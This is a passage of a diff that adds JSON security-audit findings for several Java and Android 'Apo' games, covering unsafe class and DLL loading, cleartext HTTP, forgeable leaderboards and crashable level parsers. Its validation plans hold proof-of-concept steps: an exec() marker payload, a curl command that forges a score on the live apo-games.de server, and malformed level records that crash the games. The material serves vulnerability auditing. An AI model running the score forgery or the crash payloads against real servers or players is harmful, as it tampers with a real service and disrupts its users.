@@ -1,0 +1,2779 @@
+[
+  {
+    "variant": "ApoRelax",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-494",
+    "title": "ApoClassLoader loads and instantiates classes from arbitrary file/URL paths - present but with zero call sites in this variant",
+    "reachable": false,
+    "attack_scenario": "If any sibling variant (this class is shared cloned infrastructure) wires ApoClassLoader to user-editable config or a network path, an attacker who controls path+classname gets their class instantiated inside the game process = full code execution. As shipped in ApoRelax, an attacker gains nothing: the class is inert.",
+    "validation_plan": "Reachability proof (negative): rg -n \"new ApoClassLoader|getMyClass\" --type java returns matches only inside ApoClassLoader.java itself. Danger proof (positive): compile Evil.java with a printing static initializer into dir/, run harness 'new ApoClassLoader(<dir-or-http-URL>, \"Evil\").getMyClass()' - constructor output proves arbitrary instantiation; serve the same .class over http://localhost:8000 with B_APPLET=true to prove remote loading.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoIcejump",
+    "file": "ApoIcejumpClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-829",
+    "title": "Tampered icejump.properties auto-executes an arbitrary .class",
+    "reachable": true,
+    "attack_scenario": "An attacker supplies a game directory containing a standalone Evil.class and icejump.properties with aiLeft=Evil.class, then convinces the victim to launch the desktop game with that directory as its working directory. Startup parses Evil.class as an external AI name, loads its bytes, and invokes its zero-argument constructor before checking whether it is an AI. A static initializer or constructor can therefore read or alter the victim's files, start processes, or use the network with the game's OS-account privileges. The same result follows if the victim selects a malicious AI .class using the visible load control.",
+    "validation_plan": "Compile a public default-package Evil class for the victim's Java version whose static initializer creates a marker file. Put Evil.class and an icejump.properties containing aiLeft=Evil.class in a test launch directory, start the packaged desktop game with that working directory, and confirm that the marker is created during startup. Evil need not extend ApoIcejumpAI because newInstance precedes the type check.",
+    "line": 36,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMario",
+    "file": "ApoMarioClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-829",
+    "title": "Startup property auto-instantiates arbitrary local bytecode",
+    "reachable": true,
+    "attack_scenario": "An attacker supplies or plants mario.properties containing aiLeft=EvilAI.class and a matching EvilAI.class in the victim's working directory. When the victim launches the desktop game, initialization follows the cited path without a prompt. EvilAI's public no-argument constructor executes with the game's OS-user permissions, allowing it to read or modify user files or run other Java code. It need not implement ApoMarioAI because instantiation precedes the instanceof check at ApoMarioClassLoader.java:41-44.",
+    "validation_plan": "Using the runnable game JAR as the classpath, compile EvilAI.class with a public constructor that creates a marker file named AI_EXECUTED. Put it beside a mario.properties containing aiLeft=EvilAI.class, launch ApoMarioMain from that directory, and confirm AI_EXECUTED appears before any Load Player interaction. A breakpoint at ApoMarioClassLoader.java:74 followed by one at line 41 proves the bytes are defined and instantiated.",
+    "line": 74,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSoccer",
+    "file": "ApoSoccerClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-829",
+    "title": "properties.txt can auto-execute an arbitrary AI class",
+    "reachable": true,
+    "attack_scenario": "An attacker distributes a game/mod folder containing properties.txt with \"HomeAI: Payload.class\" and a malicious Payload.class. When the victim launches the desktop game from that folder, the class is instantiated during initialization; its static initializer or constructor executes with the game process's user permissions. A direct social-engineering variant asks the victim to choose the same file through \"load Home AI\".",
+    "validation_plan": "Compile a Payload class extending ApoSoccerAI whose static initializer creates a harmless marker file. Put Payload.class and a properties.txt containing \"HomeAI: Payload.class\" in the launch directory, start ApoSoccerMain, and confirm the marker appears before any user interaction. Repeat through the load-AI chooser to confirm the second entry path.",
+    "line": 92,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSoccer",
+    "file": "ApoSoccerAIJNI.java",
+    "category": "unsafe_native_call",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-114",
+    "title": "Desktop startup loads an unverified DLL from user.dir",
+    "reachable": true,
+    "attack_scenario": "An attacker places or replaces AIMultiplexer.dll in a writable game launch directory, for example in a repackaged game archive. The victim starts ApoSoccer; Windows loads the attacker's DLL before the menu appears, executing its native initialization code with the victim's permissions.",
+    "validation_plan": "Build a same-architecture test DLL whose DllMain or JNI_OnLoad writes a harmless marker, name it AIMultiplexer.dll, place it in a disposable launch directory, and start ApoSoccerMain from that directory. The marker appearing during ApoSoccerGame.init proves the startup path. Separately select a marker AI DLL to test the native loadAI route.",
+    "line": 9,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "TutorVolley",
+    "file": "TutorVolleyClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-829",
+    "title": "Working-directory class files execute before AI type checking",
+    "reachable": true,
+    "attack_scenario": "An attacker distributes a malicious AI class as player/Human.class or replaces that file in a copied game directory. The victim launches TutorVolleyMain. Startup calls setAI before the window is made visible (TutorVolleyMain.java:48 and :61), so the file is defined and instantiated without another click. A static initializer or public no-argument constructor then runs arbitrary Java code with the victim's OS permissions. A custom class can instead be placed under player and selected using either Load Player button, whose handlers call loadPlayer at TutorVolleyPanelOptions.java:236 and :257.",
+    "validation_plan": "On a disposable runnable copy, compile a default-package Human class with a public no-argument constructor and a static initializer that writes a uniquely named marker file. Place it at player/Human.class and launch tutorVolley.TutorVolleyMain with that directory as the working directory. Creation of the marker before the options window appears proves the startup path. The probe need not implement TutorVolleyAI because TutorVolleyPanelOptions.java:147 instantiates it before the cast at :148; implementing the interface avoids the subsequent ClassCastException.",
+    "line": 42,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMarc",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-494",
+    "title": "ApoClassLoader loads and instantiates classes from arbitrary local path or URL via URLClassLoader",
+    "reachable": false,
+    "attack_scenario": "Theoretical in this variant: if a sibling variant wires this to a downloaded 'level plugin' or a level-server URL, an attacker hosting that URL serves a .class whose constructor runs arbitrary code on first instantiation. In ApoMarc itself nothing reaches it; an attacker would have to modify the JAR or add their own caller, at which point they already control the JVM.",
+    "validation_plan": "Confirm orphan status: `grep -rn \"new ApoClassLoader\" apoMarc org` returns nothing. Then prove the primitive works: compile a class Malicious { public Malicious(){Runtime.getRuntime().exec(\"touch /tmp/pwn\");} }, run `new ApoClassLoader(\"file:///tmp\", \"Malicious\").getMyClass()` in a test harness and observe /tmp/pwn created - demonstrating that any future caller hands it RCE.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMarc",
+    "file": "ApoConstants.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Highscore submit/fetch over plain HTTP to apo-games.de with unauthenticated, fully forgeable scores",
+    "reachable": false,
+    "attack_scenario": "Theoretical in this variant; real in siblings that call it. (a) Network attacker/MITM reads the player's chosen name and modifies the response of load(), injecting arbitrary scoreboard names rendered in-game. (b) Local cheat: `curl -d 'level=99&points=999999&name=cheater' http://www.apo-games.de/apoNotSoSimple/save_highscore.php` submits a top score without playing - there is no signature, token, or session in the request (verified: content string at ApoHighscore.java:74-76 is the entire payload).",
+    "validation_plan": "Orphan check: `grep -rn \"ApoHighscore\" --include=*.java . | grep -v help/ApoHighscore.java` returns nothing. Reachability of the flaw itself: run a traffic-capturing proxy (mitmproxy in transparent mode) or `tcpdump port 80`, temporarily invoke ApoHighscore.getInstance().save(7, 12345, \"test\") from a harness, observe the POST body in cleartext including name; replay the same POST via curl twice and see two identical entries accepted server-side (proves no nonce/integrity).",
+    "line": 24,
+    "clone_variants": 17,
+    "clone_distinct_versions": 13,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoNotSoSimple",
+    "file": "ApoConstants.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Plain HTTP permits tampering with shared levels, uploads, and applet progress",
+    "reachable": true,
+    "attack_scenario": "A network attacker runs an intercepting proxy or controls DNS for the HTTP request. They return a syntactically valid five-line record containing an altered tile string, username, level name, description, and solution; when the player opens User Levels, the attacker-controlled content is parsed and played. The attacker can also observe or alter editor uploads. Against the legacy applet, returning 30 from cookies.php makes setMaxLevel unlock all 31 built-in level buttons. This yields content and progression integrity compromise, not host code execution.",
+    "validation_plan": "Run the game with JVM HTTP proxy properties pointing to a local mock proxy. For get_highscore.php, answer with one well-formed record whose first line consists of layer count 1 plus 30 two-digit tile codes, including one 02 player and one 09 finish; follow it with attacker username, level-name, description, and solution lines. Open User Levels and confirm those values and tiles appear. Separately capture an editor upload to confirm readable form fields. For applet mode, answer cookies.php with 30 and confirm levels 1-31 render and can be selected.",
+    "line": 24,
+    "clone_variants": 17,
+    "clone_distinct_versions": 13,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoConstants.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Highscores, shared levels, player names, and telemetry use plain HTTP",
+    "reachable": true,
+    "attack_scenario": "A network attacker intercepts the startup HTTP traffic, reads the player's chosen name and gameplay telemetry, then replaces get_level.php or get_highscore.php responses. The modified level data is accepted at ApoSimpleUserlevelsLoad.java:140-150 and can reach the parser and solver described in ApoSimple-02 and ApoSimple-03.",
+    "validation_plan": "Launch the game with a transparent or JVM HTTP proxy, allow initialization, and capture requests to get_highscore.php, get_level.php, and game_counter.php. Confirm that name/score/form data is readable without TLS, then return an altered five-line level record and verify that ApoSimpleUserlevelsLoad stores it at lines 140-150.",
+    "line": 21,
+    "clone_variants": 17,
+    "clone_distinct_versions": 13,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSimpleSudoku",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-494",
+    "title": "Dead-code ApoClassLoader loads and instantiates classes from arbitrary file path or URL",
+    "reachable": false,
+    "attack_scenario": "Not exploitable as shipped in THIS variant because nothing calls it - this is latent cloned library code. If any future/clone wiring passes a user- or download-supplied location (e.g. 'load AI class from disk/network' as in other Apo games), anyone who can place a .class file at that location gets it instantiated inside the game JVM: local tamperer executes code, or a malicious level/AI distribution channel achieves RCE.",
+    "validation_plan": "Static proof of dormancy: `grep -rn 'new ApoClassLoader' src/` returns nothing. Dynamic proof of danger if wired: create Evil.class with a constructor calling Runtime.getRuntime().exec(\"touch /tmp/pwned\"), then invoke new ApoClassLoader(<dir-with-Evil>, \"Evil\").getMyClass(); observe /tmp/pwned created - demonstrating defineClass-equivalent execution from attacker-writable locations with no signature/integrity check.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSnake",
+    "file": "ApoSnakeConstants.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Shared levels use unauthenticated cleartext HTTP",
+    "reachable": true,
+    "attack_scenario": "An attacker controlling the level server, DNS/route, or the victim's Wi-Fi answers the startup HTTP request with altered 11-line level records; the client accepts them as shared levels. The same attacker can read, change, or drop the level= POST during upload. This gives control over downloaded game content and enables the parser and availability attacks described below.",
+    "validation_plan": "Run the app/emulator with an HTTP-intercepting proxy or map www.apo-games.de to a controlled HTTP server. Launch while connected and observe the POST to get_level.php, then create, solve, and upload a level and observe the readable level= body sent to save_level.php. Modify the download response and confirm the altered level reaches the user-level menu; packet capture showing plaintext requests and successful response substitution proves the issue.",
+    "line": 5,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 3
+  },
+  {
+    "variant": "ApoSnake",
+    "file": "ApoSnakePuzzleGame.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Malformed downloaded level strings crash the level decoder",
+    "reachable": true,
+    "attack_scenario": "A malicious server or HTTP man-in-the-middle returns one otherwise valid 11-line record whose level line is aa. Loading succeeds and exposes the userlevels button. When the victim taps it, width and height become 1, but l.charAt(2) at ApoSnakePuzzleGame.java:167 reads past the two-character string. The exception escapes every supplied caller and yields a repeatable game crash. A header byte such as _ produces a negative array dimension at line 161.",
+    "validation_plan": "Intercept get_level.php and serve these 11 lines in order: aa, 1.0, 1, 1, attacker, 0, 0, 0, 0, 1, 1.0. Launch, wait for userlevels to appear, and tap it. An IndexOutOfBoundsException/StringIndexOutOfBoundsException with ApoSnakePuzzleGame.java:167 in the stack, or process termination at that action, confirms reachability.",
+    "line": 159,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 3
+  },
+  {
+    "variant": "ApoClock",
+    "file": "ApoClockConstants.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Shared-level and leaderboard traffic uses unauthenticated HTTP",
+    "reachable": true,
+    "attack_scenario": "An attacker on the victim's Wi-Fi intercepts the initial cleartext request. They can replace downloaded leaderboard entries, modify an outgoing score, or return a crafted shared-level record. The last option reaches the game parser described in ApoClock-02 and can hang the victim's game.",
+    "validation_plan": "Run the app or an emulator through an HTTP interception proxy. Launch the app and enter Arcade to observe plaintext requests for get_level.php and get_highscore.php; complete/upload a level and finish an Arcade game to observe the plaintext POSTs. Rewrite one response or POST parameter and confirm that the client consumes or sends the modified value without any TLS or authenticity failure.",
+    "line": 5,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoClock",
+    "file": "ApoClockPuzzleGame.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Downloaded level can set a zero clock interval and hang the update loop",
+    "reachable": true,
+    "attack_scenario": "A malicious server or HTTP interceptor supplies a syntactically complete record whose level line is \"240,260,40,0,0\" and whose remaining ten metadata lines contain valid numbers/text. The victim opens Puzzle, selects userlevels, and taps to start. The next update enters the loop at ApoClockPuzzleGame.java:226 and never exits, producing an ANR or requiring the game to be killed.",
+    "validation_plan": "Use an HTTP proxy to answer get_level.php with eleven lines: level \"240,260,40,0,0\", then valid values such as time 1, count 1, total 1, name x, four zero ratings, id 1, and current time 0. Launch the app, enter Puzzle > userlevels, select the level, and tap outside the navigation controls. Capture a thread dump or ANR trace showing the update thread repeating ApoClockPuzzleGame.java:226-238.",
+    "line": 151,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoClock",
+    "file": "ApoClockHighscoreLoad.java",
+    "category": "client_side_trust",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-602",
+    "title": "Online leaderboard accepts scores asserted entirely by the client",
+    "reachable": true,
+    "attack_scenario": "A cheating player intercepts their own score POST or instruments the app, replaces points with a much larger integer, and forwards the request. Because the request carries only client assertions, the server has no submitted evidence from which to reconstruct the run. If save_highscore.php stores such requests, the attacker obtains a forged shared leaderboard position.",
+    "validation_plan": "Against an authorized staging or cloned endpoint, complete any qualifying Arcade run through an HTTP proxy and change the points field before forwarding. Then request get_highscore.php and confirm the modified value appears. Repeat with a direct form POST to determine whether the endpoint requires any state not present in the client request.",
+    "line": 92,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoDice",
+    "file": "ApoDiceConstants.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Shared levels are downloaded and uploaded over cleartext HTTP",
+    "reachable": true,
+    "attack_scenario": "On an attacker-controlled Wi-Fi network, the attacker intercepts the HTTP request to the endpoint defined at ApoDiceConstants.java:5. They replace the level feed with attacker-chosen, syntactically complete 11-line records. The client stores those strings at ApoDiceUserlevelsLoad.java:182-205 and exposes them as playable levels at ApoDiceUserlevels.java:27-32. The attacker can inject or censor shared content and can combine this with ApoDice-02 to crash the game. The same attacker can alter an outgoing level upload sent at ApoDiceUserlevelsLoad.java:130-133.",
+    "validation_plan": "In an authorized emulator, route www.apo-games.de through an intercepting proxy or test DNS mapping. Return a valid 11-line level record different from the legitimate response, launch the app, and tap userlevels. Seeing the injected level in the game and its plaintext request/response in the proxy proves the path. Repeat an editor upload and verify that the form body is readable and modifiable in transit.",
+    "line": 5,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoDice",
+    "file": "ApoDicePuzzleGame.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Downloaded level shorter than 64 characters crashes level loading",
+    "reachable": true,
+    "attack_scenario": "A malicious server or network attacker returns one complete 11-line record whose first line is just \"0\" and whose numeric metadata lines are valid. Loading succeeds and the userlevels button appears. When the victim taps it, charAt(0) succeeds but charAt(1) throws StringIndexOutOfBoundsException at ApoDicePuzzleGame.java:187; no variant code catches the exception on this path, disrupting or crashing the game.",
+    "validation_plan": "Serve an authorized test response containing these eleven fields in order: level \"0\", time 1.0, count 1, total 1, any name, four integer ratings, ID 1, and current time 1.0. Launch the app, wait for userlevels to become visible, and tap it. A logcat StringIndexOutOfBoundsException pointing to ApoDicePuzzleGame.loadLevel() line 187 confirms the issue.",
+    "line": 187,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMonoAndroid",
+    "file": "ApoMonoConstants.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Shared levels are uploaded and downloaded over unauthenticated HTTP",
+    "reachable": true,
+    "attack_scenario": "An attacker controlling the server or an on-path Wi-Fi, proxy, DNS, or routing position intercepts the plaintext POST. They replace the get_level.php body with their own syntactically valid level record, which the client installs in editorLevels, or alter an uploaded level before it reaches save_level.php. This gives the attacker control over shared-level integrity and can feed the parser in finding ApoMonoAndroid-03.",
+    "validation_plan": "Run the app or a source-compatible harness through an intercepting HTTP proxy. If the historical host is unavailable, transparently route www.apo-games.de:80 to a local stub. Observe the plaintext Get= POST, return one valid 11-line record, and confirm ApoMonoLevel.editorLevels is populated and the user-level button becomes visible. Upload an editor level and confirm the proxy can read and change the level= form body without any TLS failure.",
+    "line": 7,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMonoAndroid",
+    "file": "ApoMonoPuzzleGame.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Downloaded level strings reach fixed-position parsing without format validation",
+    "reachable": true,
+    "attack_scenario": "The attacker returns a complete 11-line server record whose level line is x00 and whose remaining numeric fields are valid. The record passes the length check and makes the user-level menu available. When the player selects it, Integer.valueOf(\"x\") throws NumberFormatException on line 240. A three-digit numeric level such as 000 instead reaches charAt(3) at line 248 and throws StringIndexOutOfBoundsException. The attacker gains a repeatable client crash after one menu action.",
+    "validation_plan": "Serve one record with lines: x00, 1, 1, 1, name, 0, 0, 0, 0, 1, 1. Launch the app online, wait for the user-level button, tap it, and capture logcat. A NumberFormatException whose stack reaches ApoMonoPuzzleGame.java:240 proves the path. Repeat with level 000 to confirm StringIndexOutOfBoundsException at line 248.",
+    "line": 240,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "myTreasureAndroid",
+    "file": "MyTreasureUserlevelsLoad.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Shared levels are downloaded and uploaded over plain HTTP",
+    "reachable": true,
+    "attack_scenario": "On a hostile Wi-Fi network, an attacker intercepts the initial HTTP POST to get_level.php and replaces its response with attacker-selected level records. The attacker can also alter or suppress the URL-encoded level body written at MyTreasureUserlevelsLoad.java:160-163 during upload. They gain control over downloaded shared content and the integrity of level submissions; parser-specific crash and exhaustion consequences are separated below.",
+    "validation_plan": "Run the non-free activity on an emulator configured through an HTTP interception proxy. Route www.apo-games.de:80 through the proxy, launch the app, and confirm an unencrypted POST containing Get= to /myTreasure/get_level.php. Replace the response with one complete 11-line record and verify it appears under Userlevels. Then create and upload an editor level and confirm the proxy can read and modify the level= form body before it reaches save_level.php.",
+    "line": 149,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "myTreasureAndroid",
+    "file": "MyTreasureGame.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Malformed downloaded level crashes the unchecked level-string parser",
+    "reachable": true,
+    "attack_scenario": "The attacker returns a syntactically complete 11-line record whose level line is 0101x0000 and whose other ten fields are valid numbers/text. Loading and sorting succeed, so the level becomes selectable. When the victim selects it, width, height, gold, and silver parse successfully, but the tile x reaches Integer.valueOf() at MyTreasureGame.java:186, producing an uncaught NumberFormatException and terminating or disabling the game execution thread.",
+    "validation_plan": "Intercept get_level.php and return these newline-delimited fields: 0101x0000, 1.0, 0, 0, attacker, 0, 0, 0, 0, 1, 0.0. Wait for the Userlevels button, open it, and select the first level. An uncaught NumberFormatException whose top application frame is MyTreasureGame.java:186, accompanied by game exit or a dead game thread, confirms the issue.",
+    "line": 186,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoBot",
+    "file": "ApoBotLevelIO.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Unbounded .bot fields drive allocations, rendering loops, and unchecked indices",
+    "reachable": true,
+    "attack_scenario": "An attacker creates a big-endian .bot beginning with levelCount=1, ySize=50000, and xSize=50000, then convinces the user to open it; alternatively, a malicious server or HTTP interceptor returns it to the applet. Allocation at line 79 exhausts the game JVM. A smaller record can set height to 2147483647 to monopolize rendering or set a 1x1 level's start point to (2,0), causing an out-of-bounds access during rendering. The result is game-process denial of service, not code execution.",
+    "validation_plan": "Run the game with -Xmx64m. Use DataOutputStream to write only the three integers 1, 50000, 50000 to a .bot and select Load; an OutOfMemoryError at ApoBotLevelIO.java:79 confirms the allocation path. For a low-memory proof, write a complete 1x1 record with ground=0, height=0, start=(2,0), direction=2, menuSize=3, and menu values 1,0,0; an ArrayIndexOutOfBoundsException at ApoBotComponent.java:546 confirms unchecked coordinates.",
+    "line": 77,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoBot",
+    "file": "ApoBotComponent.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Applet level packs are downloaded over unauthenticated HTTP",
+    "reachable": true,
+    "attack_scenario": "While a victim runs the applet-compatible build, an on-path attacker intercepts the HTTP GET and returns a valid but altered .bot. The attacker can replace the intended puzzle with a trivially winnable level, alter command allowances and displayed points, or return the malformed payload from ApoBot-01 to crash the game. TLS never authenticates the server or protects the response.",
+    "validation_plan": "Route apo-games.de through a controlled HTTP proxy or test DNS entry. Serve a structurally valid replacement easy.bot whose visible dimensions, starting position, or command counts differ from the original, then start ApoBotApplet. Capture the cleartext GET and confirm that the replacement level appears in the game; no certificate warning or integrity failure should occur.",
+    "line": 29,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoCheating",
+    "file": "ApoCheatingLoadSave.java",
+    "category": "resource_exhaustion",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-789",
+    "title": "Unchecked .cheat grid dimensions allow heap exhaustion",
+    "reachable": true,
+    "attack_scenario": "An attacker creates a tiny ObjectOutputStream-format file whose first two primitive integers are both 1000000, names it with a .cheat extension, and convinces the victim to load it. The game attempts to allocate a 1000000-by-1000000 nested int array before reading any cells. Only EOFException and IOException are caught at _from_jar_ApoCheating/apoCheating/ApoCheatingLoadSave.java:479-487, so OutOfMemoryError escapes and can terminate or render the game unusable.",
+    "validation_plan": "Create oom.cheat with ObjectOutputStream, call writeInt(1000000) twice, and close it without adding grid cells. Run the game with a bounded heap such as -Xmx128m and select oom.cheat through Load. An OutOfMemoryError whose stack points to ApoCheatingLoadSave.java:373, followed by termination or an unusable UI, confirms the finding.",
+    "line": 373,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoSimpleLevel.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Short downloaded level string terminates the main game loop when selected",
+    "reachable": true,
+    "attack_scenario": "A malicious server or HTTP interceptor returns one record consisting of level line \"x\" followed by valid metadata lines \"0\", \"1\", \"1\", and \"0\". Loading completes because the single level is not parsed during sorting. When the player selects Userlevels, substring(0, 2) throws StringIndexOutOfBoundsException and the uncaught exception terminates the game's update thread.",
+    "validation_plan": "Proxy get_level.php and respond with `x\\n0\\n1\\n1\\n0\\n`. Wait for loading, select Puzzle then Userlevels, and confirm an uncaught StringIndexOutOfBoundsException at ApoSimpleLevel.java:87 followed by cessation of the ApoSubGame update/render loop.",
+    "line": 87,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoSlitherLinkLevel.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Malformed downloaded level becomes a negative-sized array",
+    "reachable": true,
+    "attack_scenario": "A malicious server or HTTP interceptor returns the three lines \"x\", \"ignored\", and \"attacker\". The client stores \"x\" as the first custom level. When the player clicks Custom, both two-character dimension parses fail and the allocation at line 425 throws NegativeArraySizeException, terminating the uncaught game-update path and freezing normal play.",
+    "validation_plan": "Intercept get_highscore.php and return exactly \"x\\nignored\\nattacker\\n\". Wait for the startup request to complete, click Custom, and confirm NegativeArraySizeException points to ApoSlitherLinkLevel.java:425 and the game stops updating.",
+    "line": 425,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoBot",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-470",
+    "title": "Unused helper can instantiate classes from caller-selected URLs",
+    "reachable": false,
+    "attack_scenario": "There is no reproducible exploit through the shipped ApoBot UI or file/network flows. If clone-and-own reuse later passes attacker-controlled values to this helper, the attacker can place a class with a no-argument constructor at that local directory or applet-mode URL, choose its binary class name, and have its constructor execute inside the game JVM.",
+    "validation_plan": "Compile a harmless proof class whose constructor prints a unique marker, place it under a temporary class-directory hierarchy, and invoke new ApoClassLoader(directory, \"proof.Payload\").getMyClass() from a small harness. The marker proves the sink. Then repeat the source-wide reference search to confirm that ApoBot itself still has no route to the harness call.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoCommando",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
